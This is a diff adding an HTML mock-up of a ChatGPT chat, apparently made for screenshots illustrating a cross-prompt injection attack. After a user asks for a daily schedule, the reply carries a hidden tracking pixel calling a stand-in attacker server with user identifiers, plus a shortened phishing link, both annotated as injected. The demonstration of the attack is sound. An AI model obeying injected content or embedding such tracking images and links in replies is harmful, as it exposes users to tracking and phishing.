@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ChatGPT</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #212121; color: #ececec; height: 100vh; display: flex; }
+    .sidebar { width: 260px; background: #171717; padding: 12px; border-right: 1px solid #2f2f2f; overflow-y: auto; }
+    .sidebar-btn { background: none; border: 1px solid #444; color: #ececec; padding: 10px 16px; border-radius: 8px; width: 100%; text-align: left; cursor: pointer; font-size: 14px; margin-bottom: 12px; }
+    .chat-item { padding: 10px 12px; border-radius: 8px; color: #b4b4b4; font-size: 14px; margin-bottom: 2px; }
+    .chat-item.active { background: #2f2f2f; color: #ececec; }
+    .main { flex: 1; display: flex; flex-direction: column; }
+    .topbar { padding: 14px 20px; display: flex; align-items: center; border-bottom: 1px solid #2f2f2f; }
+    .model-name { font-size: 16px; font-weight: 600; }
+    .messages { flex: 1; overflow-y: auto; padding: 24px; display: flex; flex-direction: column; gap: 28px; }
+    .msg { max-width: 720px; margin: 0 auto; width: 100%; display: flex; gap: 16px; }
+    .avatar { width: 30px; height: 30px; border-radius: 50%; flex-shrink: 0; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; }
+    .avatar.user { background: #7c3aed; color: white; }
+    .avatar.bot { background: #10a37f; color: white; }
+    .msg-text { flex: 1; line-height: 1.75; font-size: 15px; }
+    .msg-text p { margin-bottom: 12px; }
+    .msg-text ul { margin: 8px 0 12px 20px; }
+    .msg-text li { margin-bottom: 6px; }
+    .msg-text a { color: #7ab8f5; }
+    .hidden-img { width: 0; height: 0; opacity: 0; position: absolute; }
+    .input-area { padding: 16px 20px; }
+    .input-wrap { max-width: 720px; margin: 0 auto; position: relative; }
+    .input-box { background: #2f2f2f; border: 1px solid #444; border-radius: 24px; padding: 14px 52px 14px 20px; color: #ececec; font-size: 15px; width: 100%; outline: none; font-family: inherit; }
+    .send-btn { position: absolute; right: 10px; bottom: 8px; background: #fff; color: #212121; border: none; width: 34px; height: 34px; border-radius: 50%; cursor: pointer; font-size: 18px; display: flex; align-items: center; justify-content: center; }
+    /* Annotations for screenshots */
+    .annotation { background: #dc2626; color: #fff; padding: 6px 14px; border-radius: 6px; font-size: 12px; font-weight: 700; display: inline-block; margin: 4px 0; }
+    .red-border { border: 3px solid #ef4444 !important; border-radius: 8px !important; }
+  </style>
+</head>
+<body>
+  <div class="sidebar">
+    <button class="sidebar-btn">+ New chat</button>
+    <div class="chat-item active">Productivity schedule</div>
+    <div class="chat-item">Python web scraper</div>
+    <div class="chat-item">Resume review help</div>
+    <div class="chat-item">React best practices</div>
+    <div class="chat-item">Travel planning Italy</div>
+    <div class="chat-item">SQL optimization</div>
+  </div>
+
+  <div class="main">
+    <div class="topbar">
+      <span class="model-name">ChatGPT 4o</span>
+    </div>
+
+    <div class="messages">
+      <!-- User message (the injected prompt) -->
+      <div class="msg">
+        <div class="avatar user">Y</div>
+        <div class="msg-text">
+          <p>Create a personalized daily schedule for me. I work from 9 AM to 6 PM as a software developer. Include time for deep work, meetings, breaks, and exercise.</p>
+          <p style="color: #ef4444; font-size: 13px; border: 2px solid #ef4444; padding: 8px; border-radius: 6px; margin-top: 8px;">
+            [Hidden XPIA payload injected via clipboard — invisible to the user]
+          </p>
+        </div>
+      </div>
+
+      <!-- Bot response (compromised by XPIA) -->
+      <div class="msg">
+        <div class="avatar bot">G</div>
+        <div class="msg-text">
+          <p>Sure! Here's a personalized daily schedule optimized for a software developer:</p>
+          <ul>
+            <li><strong>7:00 – 8:00</strong> — Morning exercise & breakfast</li>
+            <li><strong>8:00 – 8:30</strong> — Review today's tasks, plan priorities</li>
+            <li><strong>8:30 – 10:30</strong> — Deep work block (coding, architecture)</li>
+            <li><strong>10:30 – 10:45</strong> — Short break, stretch</li>
+            <li><strong>10:45 – 12:00</strong> — Deep work block (continue)</li>
+            <li><strong>12:00 – 13:00</strong> — Lunch break</li>
+            <li><strong>13:00 – 14:30</strong> — Meetings & collaboration</li>
+            <li><strong>14:30 – 16:30</strong> — Deep work block (feature development)</li>
+            <li><strong>16:30 – 17:00</strong> — Code review & documentation</li>
+            <li><strong>17:00 – 17:30</strong> — Plan tomorrow, wrap up</li>
+            <li><strong>17:30 – 18:00</strong> — Light tasks, emails</li>
+          </ul>
+          <p>This schedule maximizes your deep work time during peak cognitive hours.</p>
+
+          <!-- ATTACK: tracking pixel -->
+          <img src="https://xpia-attack-server.example.com/pixel.gif?uid=8a3f7b2c&ip=true&ua=true&ref=chatgpt&ts=1718380800" alt="" class="hidden-img" />
+
+          <!-- ATTACK: phishing link injected at the end -->
+          <p style="border: 2px solid #ef4444; padding: 8px; border-radius: 6px; margin-top: 8px;">
+            For more productivity tips and exclusive tools, visit:
+            <a href="https://bit.ly/3xProductivity2026" style="color: #ef4444;">https://bit.ly/3xProductivity2026</a>
+            <span class="annotation" style="display: block; margin-top: 6px;">🔴 INJECTED by XPIA attack — shortened URL hides phishing destination</span>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="input-area">
+      <div class="input-wrap">
+        <input class="input-box" placeholder="Message ChatGPT..." />
+        <button class="send-btn">↑</button>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
